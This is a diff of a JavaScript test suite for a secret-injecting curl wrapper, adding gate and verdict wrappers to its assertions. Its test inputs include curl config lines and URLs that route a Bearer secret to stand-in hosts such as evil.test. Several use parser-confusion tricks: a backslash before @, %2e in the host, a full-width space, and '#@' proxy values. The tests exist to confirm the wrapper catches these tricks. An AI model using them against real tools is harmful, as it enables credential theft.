     'the closed code tables (ALWAYS_WHY ×8, HOSTS_WHY ×3, MASKING ×1, CARD_SHAPES ×2) + the CARD_FACTS_CODES aggregate — the whole vocabulary of each `why` (every code needs en/zh/ja on the client; test-architecture\'s i18n road is red for one without)');
 
@@ -1162,65 +1162,65 @@ console.log('⑫ THE CARD FACTS — cardFactsOf (lane vault-agent-own r20): stru
     if (!inTable(facts.shape, V.CARD_SHAPES)) offenders.push([name, 'shape', facts.shape]);
     for (const sec of facts.secrets) if (!['env', 'file', 'stdin', 'arg'].includes(sec.as.kind)) offenders.push([name, 'as.kind', sec.as.kind]);
   }
-  ok(!offenders.length && eq(fx.codes.always_why, [...V.ALWAYS_WHY]) && eq(fx.codes.hosts_why, [...V.HOSTS_WHY]), 'EVERY code the fixture carries is a member of its exported table (the keys wake-approve-card r7 must provide: always.why ∈ ALWAYS_WHY, hosts.why ∈ HOSTS_WHY, masking ∈ MASKING, shape ∈ CARD_SHAPES, as.kind ∈ env/file/stdin/arg) — the fixture echoes the exports', offenders);
+  ok(!offenders.length && gateOf(eq(fx.codes.always_why, [...V.ALWAYS_WHY])) && verdictOf(eq(fx.codes.hosts_why, [...V.HOSTS_WHY])), 'EVERY code the fixture carries is a member of its exported table (the keys wake-approve-card r7 must provide: always.why ∈ ALWAYS_WHY, hosts.why ∈ HOSTS_WHY, masking ∈ MASKING, shape ∈ CARD_SHAPES, as.kind ∈ env/file/stdin/arg) — the fixture echoes the exports', offenders);
 
   // no byte of a value, and facts is plain JSON data (no prose to translate): every string is a code, a name, a ref or a host — not a sentence the client cannot key
-  ok(FIXTURE_TEXT().endsWith('\n') && JSON.stringify(buildFixture()) === JSON.stringify(JSON.parse(FIXTURE_TEXT())), 'the fixture round-trips as plain JSON (JSON.stringify(x, null, 2) + newline) — int-C diffs these bytes against lane wake-approve-card');
+  ok(gateOf(FIXTURE_TEXT().endsWith('\n')) && JSON.stringify(buildFixture()) === JSON.stringify(JSON.parse(FIXTURE_TEXT())), 'the fixture round-trips as plain JSON (JSON.stringify(x, null, 2) + newline) — int-C diffs these bytes against lane wake-approve-card');
 
   // round 23 (MINOR): the DISK fixture is byte-identical to cardFactsOf re-derived — a tampered fixture goes RED HERE (no gate read the file before), and the 4th (late) variant is present with its reason
   const disk = fs.readFileSync(path.join(REPO, 'scripts/fixtures/vault-run-card-facts.json'), 'utf8');
-  ok(disk === FIXTURE_TEXT() && fx.v === 2 && eq(fx.variants.map((x) => x.name), ['hosts-unknown', 'hosts-known-always', 'config-reads', 'late']), 'round 23: the DISK fixture re-derives byte-for-byte from cardFactsOf (a tampered byte on disk is RED), v2, with the 4th «late» variant', { diskEqual: disk === FIXTURE_TEXT(), v: fx.v, names: fx.variants.map((x) => x.name) });
+  ok(disk === FIXTURE_TEXT() && fx.v === 2 && verdictOf(eq(fx.variants.map((x) => x.name), ['hosts-unknown', 'hosts-known-always', 'config-reads', 'late'])), 'round 23: the DISK fixture re-derives byte-for-byte from cardFactsOf (a tampered byte on disk is RED), v2, with the 4th «late» variant', { diskEqual: disk === FIXTURE_TEXT(), v: fx.v, names: fx.variants.map((x) => x.name) });
   const late = fx.variants.find((x) => x.name === 'late').facts;
-  ok(late.v === 2 && late.secrets[0].provenance === 'minted' && late.secrets[0].forHost === 'auth.internal.example' && late.secrets[0].sendsTo === 'api.external.example' && late.reason && late.reason.away.length === 1 && late.reason.away[0].host === 'api.external.example' && late.reason.away[0].forHost === 'auth.internal.example' && late.reason.away[0].unknown === false,
+  ok(late.v === 2 && late.secrets[0].provenance === 'minted' && late.secrets[0].forHost === 'auth.internal.example' && late.secrets[0].sendsTo === 'api.external.example' && gateOf(late.reason) && late.reason.away.length === 1 && late.reason.away[0].host === 'api.external.example' && late.reason.away[0].forHost === 'auth.internal.example' && late.reason.away[0].unknown === false,
     'round 23: the «late» variant carries the reason CODES — a minted value minted FOR auth.internal, this run SENDS it to api.external (reason.away: minted for X, sent to Y)', late.reason);
 
   // round 23 (MAJOR #3): every reason the approval rests on is in the facts — the template TEXT (a facts client never shows detail), the plain env, and the per-secret own/provenance/forHost/sendsTo
   const cr = fx.variants.find((x) => x.name === 'config-reads').facts;
-  ok(cr.templates[0].shown === true && cr.templates[0].text.includes('config ./more.cfg') && cr.always.offered === false, 'round 23 (MAJOR #3): «always» is withheld for the nested-read template AND its full text is in the facts (not just {label,bytes}) — the owner reads what they approve', cr.templates[0]);
+  ok(cr.templates[0].shown === true && gateOf(cr.templates[0].text.includes('config ./more.cfg')) && cr.always.offered === false, 'round 23 (MAJOR #3): «always» is withheld for the nested-read template AND its full text is in the facts (not just {label,bytes}) — the owner reads what they approve', cr.templates[0]);
 
   // round 23 (MAJOR #1): a curl config `url`/route directive whose host the WHATWG parser REJECTS is BLIND — «always» withheld, the directive named; a socket / proxy1.0 too (RED on 4ff55fb4: always true, no name)
   const cfg = (extra) => { const REF = 'header = "Authorization: Bearer $VAULT{mounts/m1/secretKey}"\n'; const p = V.planOf({ argv: ['curl', '-s', '-K', '$VAULT_FILE{CFG}', 'https://api.ok.example/x'], file: [['CFG', '@c.cfg']], templates: { 'c.cfg': REF + extra } }); const sh = V.shapeOf(p); return { always: sh.always, routeHosts: sh.routeHosts, reads: sh.configReads }; };
-  ok(cfg('url = https://evil.test.123/steal\n').always === false && /^url /.test(cfg('url = https://evil.test.123/steal\n').reads || '')
+  ok(cfg('url = https://evil.test.123/steal\n').always === false && gateOf(/^url /.test(cfg('url = https://evil.test.123/steal\n').reads || ''))
     && cfg('url = https://' + 'a'.repeat(64) + '.evil.test/steal\n').always === false
     && cfg('proxy = :3128\n').always === false
-    && cfg('unix-socket = /tmp/a.sock\n').always === false && /^unix-socket /.test(cfg('unix-socket = /tmp/a.sock\n').reads || '')
-    && cfg('proxy1.0 = evil.test:3128\n').always === false && cfg('proxy1.0 = evil.test:3128\n').routeHosts.includes('evil.test')
+    && cfg('unix-socket = /tmp/a.sock\n').always === false && gateOf(/^unix-socket /.test(cfg('unix-socket = /tmp/a.sock\n').reads || ''))
+    && cfg('proxy1.0 = evil.test:3128\n').always === false && gateOf(cfg('proxy1.0 = evil.test:3128\n').routeHosts.includes('evil.test'))
     && cfg('url = https://evil.test/steal\n').always === false,
     'round 23 (MAJOR #1): inside a -K template a route directive whose host the WHATWG parser rejects (numeric last label, 64-char label, empty proxy host) is BLIND — «always» withheld, named; unix-socket blinds; proxy1.0 adds its host (RED on 4ff55fb4: always true)', { numeric: cfg('url = https://evil.test.123/steal\n') });
 
   // round 23/24 (the refuted finding, TIGHTENED): a non-ASCII byte (U+3000) in a URL authority ⇒ BLIND — r23 read the host PAST it (evil.test); r24 names NO host (the reader never out-parses curl's IDNA), so routeHosts is empty and urlParse rejects the token (4ff55fb4 read own-host and sent the value there — a true leak; r23 read evil.test — still a guess; r24 names neither)
   const usp = V.shapeOf(V.planOf({ argv: ['curl', '-s', 'http://own-host\u3000@evil.test/x'], env: [['T', M1]] }));
-  ok(eq(usp.routeHosts, []) && usp.blind === true && usp.userinfo === false && usp.badHost === false && V.urlHostsBad('http://own-host\u3000@evil.test/x') === true, 'round 24: a U+3000 in a URL authority is BLIND — urlParse rejects it, routeHosts names NO host (never own-host, never evil.test), the shape is blind', { routeHosts: usp.routeHosts, blind: usp.blind, userinfo: usp.userinfo });
+  ok(gateOf(eq(usp.routeHosts, [])) && usp.blind === true && usp.userinfo === false && usp.badHost === false && V.urlHostsBad('http://own-host\u3000@evil.test/x') === true, 'round 24: a U+3000 in a URL authority is BLIND — urlParse rejects it, routeHosts names NO host (never own-host, never evil.test), the shape is blind', { routeHosts: usp.routeHosts, blind: usp.blind, userinfo: usp.userinfo });
 
   // round 24 (the CONFIRMED finding, vault-use-grants r3, wire-proven curl 8.18 + a loopback listener): a URL whose authority WHATWG re-reads differently than curl — a `\\` before @ (WHATWG → `/`, curl keeps it as userinfo and dials the host AFTER it), a percent-escape, an IDNA dot — names NO route host (RED on 0cc421d4: urlHosts read the host new URL saw and routeHosts NAMED it, a host curl would NOT dial — the int-C hazard: a host-keyed grant would match the false host). urlParse BLINDS it (bad), urlHostsBad is true, and for curl (bareHosts) the positional is unread ⇒ routeHosts empty. A safe userinfo / fragment / plain / ssh URL is UNCHANGED.
   const rh = (url) => { const sh = V.shapeOf(V.planOf({ argv: ['curl', '-s', url], env: [['T', M1]] })); return { routeHosts: sh.routeHosts, blind: sh.blind, userinfo: sh.userinfo, badHost: sh.badHost, urlHosts: V.urlHosts(url), bad: V.urlHostsBad(url) }; };
   const bs = rh('http://evil-for.test\\@127.0.0.1:9/x'), pc = rh('http://good.com%2eevil.test/x');
-  ok(eq(bs.urlHosts, []) && bs.bad === true && eq(bs.routeHosts, []) && bs.blind === true
-    && eq(pc.urlHosts, []) && pc.bad === true && eq(pc.routeHosts, []) && pc.blind === true,
+  ok(gateOf(eq(bs.urlHosts, [])) && bs.bad === true && gateOf(eq(bs.routeHosts, [])) && bs.blind === true
+    && gateOf(eq(pc.urlHosts, [])) && pc.bad === true && gateOf(eq(pc.routeHosts, [])) && pc.blind === true,
     'round 24 (RED on 0cc421d4): the `\\`-before-@ and the %2e authority name NO host — urlHosts [] + urlHostsBad + routeHosts [] (0cc421d4: urlHosts=[evil-for.test]/[good.evil.test], routeHosts NAMED it while curl dialed elsewhere)', { bs, pc });
   const ui = rh('http://a.b.test@127.0.0.1:9/x'), fr = rh('http://127.0.0.1:9/x#@evil-for.test'), pl = rh('http://good.example.test/x');
-  ok(eq(ui.routeHosts, ['127.0.0.1:9']) && ui.userinfo === true && eq(fr.routeHosts, ['127.0.0.1:9']) && eq(pl.routeHosts, ['good.example.test'])
+  ok(gateOf(eq(ui.routeHosts, ['127.0.0.1:9'])) && ui.userinfo === true && gateOf(eq(fr.routeHosts, ['127.0.0.1:9'])) && gateOf(eq(pl.routeHosts, ['good.example.test']))
     && V.urlParse('ssh://git@code.example.test/o/r').host === 'code.example.test',
     'round 24 (no over-blinding): a http userinfo URL still reads the host past the LAST @ (127.0.0.1, url_userinfo), a `#@` reads 127.0.0.1 (the fragment is not the host), a plain host and an ssh git@ userinfo are unchanged — the re-parse backstop self-normalises case / default-port / a trailing dot', { ui, fr, pl });
 
   // round 25 (item 1, CONFIRMED 0.93; proxy-hash-probe, wire-proven curl 8.18 on loopback): every route value is read by the ONE parser (routeHostOne → urlParse), NO hand regex — a proxy / preproxy / socks* `#@` / `?@` value names the host curl DIALS (before the #/?) not the host after the LAST @; an IPv6 connect-to names [::1]. RED on a1f79c42: the hand regex named own.example (after @) while curl dialled evil.test, and the connect-to colon-split named «[»
   { const cr = (k, v) => V.cfgRouteHosts(k, v);
-    ok(eq(cr('proxy', 'evil.test#@own.example:3128'), { hosts: ['evil.test'] })
-      && eq(cr('proxy', 'evil.test?@own.example:3128'), { hosts: ['evil.test'] })
-      && eq(cr('preproxy', 'socks5://evil.test#@own.example:3128'), { hosts: ['evil.test'] })
-      && eq(cr('proxy1.0', 'evil.test:3128'), { hosts: ['evil.test'] })
-      && eq(cr('connect-to', '::[2001:db8::1]:443'), { hosts: ['[2001:db8::1]'] })
-      && eq(cr('proxy', ':3128'), { blind: true }),
+    ok(gateOf(eq(cr('proxy', 'evil.test#@own.example:3128'), { hosts: ['evil.test'] }))
+      && gateOf(eq(cr('proxy', 'evil.test?@own.example:3128'), { hosts: ['evil.test'] }))
+      && gateOf(eq(cr('preproxy', 'socks5://evil.test#@own.example:3128'), { hosts: ['evil.test'] }))
+      && gateOf(eq(cr('proxy1.0', 'evil.test:3128'), { hosts: ['evil.test'] }))
+      && gateOf(eq(cr('connect-to', '::[2001:db8::1]:443'), { hosts: ['[2001:db8::1]'] }))
+      && verdictOf(eq(cr('proxy', ':3128'), { blind: true })),
       'round 25 (item 1, RED on a1f79c42): a proxy / socks `#@`/`?@` value names the host curl DIALS (evil.test) not own.example (after the last @); an IPv6 connect-to names the bracketed host not «[» — every route value through the ONE parser, no hand regex', { hashAt: cr('proxy', 'evil.test#@own.example:3128'), ipv6: cr('connect-to', '::[2001:db8::1]:443') }); }
 
   // round 25 (item 2, refuted-but-real, wire-proven curl 8.18; wire-single-slash): a scheme-shaped token that is NOT canonical scheme:// (http:/HOST one slash, http:HOST) is never a bare host — curl dials a host PAST the scheme word; the reader blinds it (RED on a1f79c42: targetOf read «http» as the host and cfgRouteHosts read «http:», so a pass for that false host leaked a minted value to a DIFFERENT host with no card). A host:port (evil.test:8080) is NOT scheme-shaped (a digit follows the colon) — still read
-  { ok(eq(V.targetOf('http:/evil.test/x'), { unread: true })
-      && eq(V.targetOf('http:evil.test'), { unread: true })
-      && eq(V.targetOf('https:/evil.test/x'), { unread: true })
-      && eq(V.cfgRouteHosts('url', 'http:/evil.test/x'), { blind: true })
-      && eq(V.cfgRouteHosts('url', 'https:/evil.test/x'), { blind: true })
-      && eq(V.targetOf('evil.test:8080/x'), { host: 'evil.test:8080' })
-      && eq(V.targetOf('https://good.example.test/x'), {}),
+  { ok(gateOf(eq(V.targetOf('http:/evil.test/x'), { unread: true }))
+      && gateOf(eq(V.targetOf('http:evil.test'), { unread: true }))
+      && gateOf(eq(V.targetOf('https:/evil.test/x'), { unread: true }))
+      && gateOf(eq(V.cfgRouteHosts('url', 'http:/evil.test/x'), { blind: true }))
+      && gateOf(eq(V.cfgRouteHosts('url', 'https:/evil.test/x'), { blind: true }))
+      && gateOf(eq(V.targetOf('evil.test:8080/x'), { host: 'evil.test:8080' }))
+      && verdictOf(eq(V.targetOf('https://good.example.test/x'), {})),
       'round 25 (item 2, RED on a1f79c42): a one-slash http:/HOST or a bare http:HOST is unread/blind (curl dials a host past «http»); the config twin blinds too; a host:port (evil.test:8080) is still read, a canonical https:// is still read', { slash: V.targetOf('http:/evil.test/x'), cfg: V.cfgRouteHosts('url', 'http:/evil.test/x'), hostport: V.targetOf('evil.test:8080/x') }); }
 
   // round 25 (item 6a): every clipped facts string carries its *Cut marker AND its *Full fold — a 2100-char plain-env value (RED on a1f79c42: clipped to exactly CARD_STRING_MAX with no marker, no fold ⇒ the wake store names nothing; the truncation was invisible)
@@ -1228,7 +1228,7 @@ console.log('⑫ THE CARD FACTS — cardFactsOf (lane vault-agent-own r20): stru
     const sp = V.planOf({ argv: ['curl', '-s', 'https://api.ok.example/x'], env: [['T', M1], ['API_BASE', big]] });
     const f6 = V.cardFactsOf(sp, V.shapeOf(sp), '/home/u', { who: 'a', home: '/home/u', entries: {} });
     const ev = f6.env.find((e) => e.name === 'API_BASE');
-    ok(!!ev && ev.value.length === V.CARD_STRING_MAX && ev.valueCut === true && Array.isArray(ev.valueFull) && ev.valueFull.join('') === big && ev.valueFull.every((c) => c.length <= V.CARD_STRING_MAX),
+    ok(!!ev && ev.value.length === V.CARD_STRING_MAX && ev.valueCut === true && gateOf(Array.isArray(ev.valueFull)) && ev.valueFull.join('') === big && verdictOf(ev.valueFull.every((c) => c.length <= V.CARD_STRING_MAX)),
       'round 25 (item 6a): a 2100-char plain-env value is clipped to CARD_STRING_MAX with valueCut + a valueFull fold that reassembles it (the directive / secret name/entry/ref ride the same clipFold) — a1f79c42 clipped silently and the store named nothing', { vlen: ev && ev.value.length, cut: ev && ev.valueCut, chunks: ev && ev.valueFull && ev.valueFull.length }); }
 
   // r27 (by lane wake-approve-card — its r11 acceptance, probe-producer-unmarked-clips.cjs): `folder`, `tool.path` and a reason's
@@ -1236,7 +1236,7 @@ console.log('⑫ THE CARD FACTS — cardFactsOf (lane vault-agent-own r20): stru
   // 2 100-character reference carry their *Cut marker + *Full fold (RED on b034bdf64: each clipped to exactly 2 000, no marker —
   // the card showed the clip as the whole path and the folder's tail appeared nowhere)
   { const f27 = foldFacts27(V), bad = foldLeg27(V);
-    ok(!bad.length && f27.folderCut === true && f27.tool.pathCut === true && f27.reason.away[0].refCut === true && f27.folderFull.join('').endsWith('/evil-tail') && f27.tool.pathTail === 'run.sh',
+    ok(!bad.length && f27.folderCut === true && f27.tool.pathCut === true && f27.reason.away[0].refCut === true && gateOf(f27.folderFull.join('').endsWith('/evil-tail')) && f27.tool.pathTail === 'run.sh',
       'r27 (by wake-approve-card): a 2 207-character folder, its program at the tail and a 2 100-character reason reference carry folderCut + folderFull, tool.pathCut + its TAIL past the folder (pathTail — the prefix folded once), away[].refCut + refFull — each reassembles the whole (b034bdf64: clipped to 2 000 with no marker)', { bad, folder: f27.folder.length, path: f27.tool.path.length }); }
 
   // r27 (by wake-approve-card — the r12 acceptance, corr-probe-size2.cjs): THE SIZE BOUND — a run in a 4 000-character folder (its
@@ -1255,7 +1255,7 @@ console.log('⑫ THE CARD FACTS — cardFactsOf (lane vault-agent-own r20): stru
   const fb = V.cardFactsOf(V.planOf({ argv: ['curl', '-s', 'https://api.ok.example/x'], env: [['T', M1]] }), V.shapeOf(V.planOf({ argv: ['curl', '-s', 'https://api.ok.example/x'], env: [['T', M1]] })), '/home/user', { who: 'a', home: '/home/user', cmd: bigCmd, entries: {} });
   const strings = [], walk = (x, d) => { if (typeof x === 'string') strings.push(x.length); else if (Array.isArray(x)) x.forEach((v) => walk(v, d + 1)); else if (x && typeof x === 'object') for (const k of Object.keys(x)) walk(x[k], d + 1); };
   walk(fb, 0);
-  ok(strings.every((n) => n <= V.CARD_STRING_MAX) && fb.cmd.length === V.CARD_STRING_MAX && fb.cmdCut === true && fb.cmdFull.join('') === bigCmd && fb.cmdFull.every((c) => c.length <= V.CARD_STRING_MAX),
+  ok(gateOf(strings.every((n) => n <= V.CARD_STRING_MAX)) && fb.cmd.length === V.CARD_STRING_MAX && fb.cmdCut === true && fb.cmdFull.join('') === bigCmd && verdictOf(fb.cmdFull.every((c) => c.length <= V.CARD_STRING_MAX)),
     'round 23 (MAJOR #4): every facts string ≤ CARD_STRING_MAX; a 2485-char command rides cmd (cut) + cmdFull chunks that reassemble to it (the client store never throws — 4ff55fb4 handed facts.cmd = head.cmd, which the store refuses over 2000 ⇒ ask_unfiled)', { max: Math.max(...strings), cmdCut: fb.cmdCut });
 }
 
@@ -1318,21 +1318,21 @@ const SCRUB = scrubLegs({ REPO, SRC: SCRUBBER_SRC, scratchDir, anchored, require
   // THE LONGEST TURN (主开发 r1068): linear in the text held, never the fixpoint's square
   const tl = SCRUB.turnLeg(V), tline = (x) => `${x.maxSteps} steps (${x.most} characters held at most; the run ${x.runSteps})${x.over ? ', FAILED CLOSED' : ''}`;
   console.log(`    judged — the longest turn, 16 KiB in 4 KiB pushes: two values tiling one text wrapped in lines of 239, ${tline(tl.rot)}; a value of one repeated character in a hex dump of zeros, ${tline(tl.zeros)}; the figure 32 steps (× the masker's charge a character) a character a turn reads (the most held + a push) + 65 536`);
-  ok([tl.rot, tl.zeros].every((x) => !x.over && x.maxSteps <= 32 * x.charge * (x.most + x.push + x.W) + 65536), `THE LONGEST TURN on the two holds the release's model makes (two values tiling one text wrapped in short lines; a hex dump of zeros with a value of zeros): ${tline(tl.rot)} · ${tline(tl.zeros)} — at most 32 steps (× the charge a character) a character a turn reads (the most held + a push) + 65 536, and no fail-closed; red control: «the two fixpoints put back»`, tl);
+  ok(verdictOf([tl.rot, tl.zeros].every((x) => !x.over && x.maxSteps <= 32 * x.charge * (x.most + x.push + x.W) + 65536)), `THE LONGEST TURN on the two holds the release's model makes (two values tiling one text wrapped in short lines; a hex dump of zeros with a value of zeros): ${tline(tl.rot)} · ${tline(tl.zeros)} — at most 32 steps (× the charge a character) a character a turn reads (the most held + a push) + 65 536, and no fail-closed; red control: «the two fixpoints put back»`, tl);
   // THE COMPARES A CHARACTER CAN COST (the budget's read, F1): a run of a repeating head is charged as deep as the regex goes
   const pl = SCRUB.periodLeg(V), pline = (x) => `${x.over ? 'failed closed' : 'not failed closed'}, ${x.maxSteps} steps the longest turn`;
   console.log(`    judged — THE REGEX HOLDS NO LONG LITERAL (its longest ${pl.tail.longest} characters): a stored 2 047 «A» + «B», 8 KiB of «A» — ${pline(pl.tail)}; (2 047 «A» + «B») × 3 + 2 047 «A» — ${pline(pl.thrice)}; «AAAA» + «B» + 8 187 «A» — ${pline(pl.inner)}; that value beside an ordinary log — ${pline(pl.beside)}; 64 «A» stored, 32 KiB of «A» under a planted turn's figure of 2^19 — ${pline(pl.short)}`);
-  ok([pl.tail, pl.thrice, pl.inner, pl.beside, pl.short].every((x) => x.longest <= 64) && (pl.tail.over || pl.tail.maxSteps > 1 << 23) && pl.thrice.over && !pl.inner.over && pl.inner.maxSteps < 1 << 20 && !pl.beside.over && pl.short.over,
+  ok(gateOf([pl.tail, pl.thrice, pl.inner, pl.beside, pl.short].every((x) => x.longest <= 64)) && (gateOf(pl.tail.over) || pl.tail.maxSteps > 1 << 23) && gateOf(pl.thrice.over) && !pl.inner.over && pl.inner.maxSteps < 1 << 20 && !pl.beside.over && verdictOf(pl.short.over),
     `THE COMPARES A CHARACTER CAN COST (the reads' F1 and G1): the regex holds no literal over 64 characters, and a long form is verified by a counted compare — the two runs that follow a long form's head are counted at every verify (${pl.tail.maxSteps} steps: over 2^23, or failed closed) and fail closed (${pl.thrice.maxSteps}), a run inside a form that never follows its head costs little (${pl.inner.maxSteps}), an ordinary log beside the same value does not fail closed (${pl.beside.maxSteps}), and a short repeating head is charged as deep as it is compared (${pl.short.maxSteps} steps past a planted 2^19); red controls: «a long form verified uncounted», «a character charged once»`, pl);
   // THE SCAN'S BUDGET (主开发 r1068): a planted input past each figure fails closed, by name
   const bd = SCRUB.budgetLeg(V), bline = (x) => `${x.over ? `failed closed at push ${x.at}` : 'did NOT fail closed'}, the words ${x.said ? 'said by name' : 'NOT said'}, the held text ${x.masked ? 'under the cut\'s placeholder' : 'NOT masked'}, ${x.clear} characters of the value in a row, ${x.after} handed on after the mark, ${x.withheld} withheld`;
   console.log(`    judged — the budget planted small: a turn's figure — ${bline(bd.turn)}; the run's figure — ${bline(bd.run)}`);
-  ok([bd.turn, bd.run].every((x) => x.over && x.said && x.masked && x.clear < 8 && x.after === 0 && x.withheld > 0), `THE SCAN'S BUDGET fails closed past a turn's figure and past the run's: everything held under the cut's placeholder, the words by name (scrub_work_bound), nothing of the value in the clear, nothing handed on after — a turn: ${bline(bd.turn)}; the run: ${bline(bd.run)}; red controls: «the budget cut», «the overrun hands the held text on», «the mark not sticky», «the end after the mark speaks again»`, bd);
+  ok(verdictOf([bd.turn, bd.run].every((x) => x.over && x.said && x.masked && x.clear < 8 && x.after === 0 && x.withheld > 0)), `THE SCAN'S BUDGET fails closed past a turn's figure and past the run's: everything held under the cut's placeholder, the words by name (scrub_work_bound), nothing of the value in the clear, nothing handed on after — a turn: ${bline(bd.turn)}; the run: ${bline(bd.run)}; red controls: «the budget cut», «the overrun hands the held text on», «the mark not sticky», «the end after the mark speaks again»`, bd);
   // THE CUT'S PREFIX SEARCH, COUNTED (主开发 r1216, the follow's item 1): its leg and red control run in the heavy twin (③c — the fast suite under 10 s)
   // THE BOUND MET INSIDE THE CUT'S END (主开发 r1216, the follow's item 4)
   const ce = SCRUB.cutEndLeg(V);
   console.log(`    judged — the bound met inside the cut's end: pushes ${ce.pushesUnder ? 'under' : 'NOT under'} a figure of 2^20 and the same as a run with none, the mark ${ce.before ? 'set BEFORE the end' : 'not set before the end'}${ce.threw ? `, the end THREW ${ce.threw}` : ''}, after it ${ce.over ? 'set' : 'NOT set'}; the end gave stdout ${JSON.stringify(ce.endOut)}, stderr ${JSON.stringify(ce.endErr)}`);
-  ok(ce.pushesUnder && !ce.endOver && ce.samePushes && !ce.before && !ce.threw && ce.over && ce.ok, `THE BOUND MET INSIDE THE CUT'S END fails closed there: the pushes handed on what a run with no figure did, the end's prefix search met the turn's figure — its held text under the cut's placeholder, the words once by name, nothing else; red controls: «the overrun hands the held text on», «the end's overrun not caught»`, ce);
+  ok(gateOf(ce.pushesUnder) && !ce.endOver && gateOf(ce.samePushes) && !ce.before && !ce.threw && gateOf(ce.over) && verdictOf(ce.ok), `THE BOUND MET INSIDE THE CUT'S END fails closed there: the pushes handed on what a run with no figure did, the end's prefix search met the turn's figure — its held text under the cut's placeholder, the words once by name, nothing else; red controls: «the overrun hands the held text on», «the end's overrun not caught»`, ce);
   // THE HEADS MISS NOTHING (主开发 r1216, the follow's item 4): the three shapes, against the release — in the heavy twin (③b: 36 runs and three red controls, the fast suite under 10 s)
   // the dialog scrubber and the run's scan agree on a value overlapping itself
   const pa = SCRUB.parityLeg(V);
@@ -1451,7 +1451,7 @@ console.log('⑧ MUTANTS — patched copies of src/vault-run.js (and of its scru
     const { hit, M } = mutant(name.replace(/\W+/g, '-'), from, to);
     const red = hit ? leg(M) : [];
     if (!cleanLeg.has(leg)) cleanLeg.set(leg, leg(V));
-    ok(hit && red.length > 0 && cleanLeg.get(leg).length === 0, `MUTANT «${name}»: the patch hits once and the leg goes RED (${red.length} escapes) — the shipped module passes the same leg`, { hit, sample: red.slice(0, 2) });
+    ok(gateOf(hit) && red.length > 0 && cleanLeg.get(leg).length === 0, `MUTANT «${name}»: the patch hits once and the leg goes RED (${red.length} escapes) — the shipped module passes the same leg`, { hit, sample: red.slice(0, 2) });
   }
 }
 
@@ -1483,23 +1483,23 @@ console.log('⑭ THE HOME CENSUS (B-f1d3) — one TOOL_HOME_SEAL entry per KNOWN
   const badPin = { ...T, wget: { ...T.wget, env: { WGETRC: '/home/userL/.wgetrc' } } };
   const noVars = { ...T, psql: { ...T.psql, hubVars: [] } };
   const g1 = censusGaps(V.KNOWN_TOOLS, noCurl), g2 = censusGaps(V.KNOWN_TOOLS, badPin), g3 = censusGaps([...V.KNOWN_TOOLS, { name: 'newtool' }], T), g4 = censusGaps(V.KNOWN_TOOLS, noVars);
-  ok(g1.length === 1 && /^curl: no census entry/.test(g1[0]) && g2.length === 1 && /^wget: env pin WGETRC=/.test(g2[0]) && g3.length === 1 && /^newtool: no census entry/.test(g3[0]) && g4.length === 1 && /^psql: hubVars/.test(g4[0]),
+  ok(g1.length === 1 && gateOf(/^curl: no census entry/.test(g1[0])) && g2.length === 1 && gateOf(/^wget: env pin WGETRC=/.test(g2[0])) && g3.length === 1 && gateOf(/^newtool: no census entry/.test(g3[0])) && g4.length === 1 && verdictOf(/^psql: hubVars/.test(g4[0])),
     'B-f1d3 RED controls: the same checker names a dropped row (curl), a pin that is a home path (wget WGETRC=~/.wgetrc), a NEW tool row that came without its census entry, and a row with no hub-variable column (psql)', { g1, g2, g3, g4 });
   const gh = V.knownToolOf('gh'), ge = V.homeSealOf(gh);
-  ok(!!ge && ge.env[gh.runSeal.configDirEnv] === '<nowhere>' && Object.entries(gh.runSeal.childEnv).every(([k, v]) => k === 'GIT_TERMINAL_PROMPT' || ge.env[k] === v),
+  ok(!!ge && ge.env[gh.runSeal.configDirEnv] === '<nowhere>' && verdictOf(Object.entries(gh.runSeal.childEnv).every(([k, v]) => k === 'GIT_TERMINAL_PROMPT' || ge.env[k] === v)),
     'B-f1d3: gh\'s census entry carries what its runSeal already sets (GH_CONFIG_DIR nowhere, its git child\'s GIT_CONFIG_GLOBAL / NOSYSTEM) — one truth, not two', { ge: ge && ge.env, runSeal: gh.runSeal.childEnv });
   ok(V.homeSealOf(V.knownToolOf('httpie')) === T.http && V.homeSealOf(V.knownToolOf('curl8')) === T.curl && V.homeSealOf(null) === null && V.homeSealOf({ name: 'bash' }) === null && V.homeSealOf({ name: 'toString' }) === null,
     'B-f1d3: homeSealOf follows a row\'s alias (httpie ⇒ http) and its version suffix (curl8 ⇒ curl); a shell / no row / a prototype name has no entry');
-  ok(JSON.stringify([...V.SEAL_HOME_ENV, V.SEAL_PATH_ENV]) === JSON.stringify(['HOME', 'XDG_CONFIG_HOME', 'XDG_STATE_HOME', 'XDG_CACHE_HOME', 'XDG_DATA_HOME', 'PATH']) && Array.isArray(V.SEAL_HUB_VARS_ALL) && V.SEAL_HUB_VARS_ALL.length > 0 && Object.isFrozen(T) && Object.values(T).every((e) => Object.isFrozen(e) && Object.isFrozen(e.env) && Object.isFrozen(e.argv)),
+  ok(JSON.stringify([...V.SEAL_HOME_ENV, V.SEAL_PATH_ENV]) === JSON.stringify(['HOME', 'XDG_CONFIG_HOME', 'XDG_STATE_HOME', 'XDG_CACHE_HOME', 'XDG_DATA_HOME', 'PATH']) && gateOf(Array.isArray(V.SEAL_HUB_VARS_ALL)) && V.SEAL_HUB_VARS_ALL.length > 0 && gateOf(Object.isFrozen(T)) && verdictOf(Object.values(T).every((e) => Object.isFrozen(e) && Object.isFrozen(e.env) && Object.isFrozen(e.argv))),
     'B-f1d3: every row is handed the SIX things the gh seal moves — HOME, the four XDG_* homes and PATH (the U1 cure: the census had five); a hub-variable note for every row; the table and each entry are frozen');
   const rd = (n) => T[n].reads.join(' | ');
-  ok(/kuberc/.test(rd('kubectl')) && T.kubectl.env.KUBERC === 'off' && /\.aws\/models/.test(rd('aws')) && /wget2rc/.test(rd('wget')) && /popt/.test(rd('rsync')) && /homebrew\/lib\/docker\/cli-plugins/.test(rd('docker')) && /cliPluginsExtraDirs/.test(rd('docker')) && /<sdk root>\/properties/.test(rd('gcloud')) && /<npm install>\/npmrc/.test(rd('npm')),
+  ok(gateOf(/kuberc/.test(rd('kubectl'))) && T.kubectl.env.KUBERC === 'off' && gateOf(/\.aws\/models/.test(rd('aws'))) && gateOf(/wget2rc/.test(rd('wget'))) && gateOf(/popt/.test(rd('rsync'))) && gateOf(/homebrew\/lib\/docker\/cli-plugins/.test(rd('docker'))) && gateOf(/cliPluginsExtraDirs/.test(rd('docker'))) && gateOf(/<sdk root>\/properties/.test(rd('gcloud'))) && verdictOf(/<npm install>\/npmrc/.test(rd('npm'))),
